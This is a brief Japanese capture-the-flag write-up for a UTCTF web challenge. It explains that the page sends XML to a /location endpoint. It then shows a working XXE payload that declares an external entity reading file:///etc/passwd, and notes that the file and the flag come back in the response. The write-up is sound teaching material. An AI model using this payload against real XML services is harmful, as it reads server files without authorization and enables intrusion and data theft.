

'''
http://web1.utctf.live:5005/

# 前提知識

- XXE

# 解説

ボタンを押すと文字が表示されるが、ネットワーク通信を確認すると、
`http://web1.utctf.live:5005/location`に対してPOST通信している。
リクエストの中身を見ると、XMLファイルを送っている。

```
<?xml version="1.0" encoding="UTF-8"?>
<locationCheck><productId>1</productId></locationCheck>
```

productIdを4とかにしてみると、`Invalid ProductId: 4`と出てくる。
ほう。
XMLといえば、XXEなので、これをやってみる。

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<locationCheck><productId>&xxe;</productId></locationCheck>
```

これをやると、ぞろぞろ出てきて、flagも入っている。
'''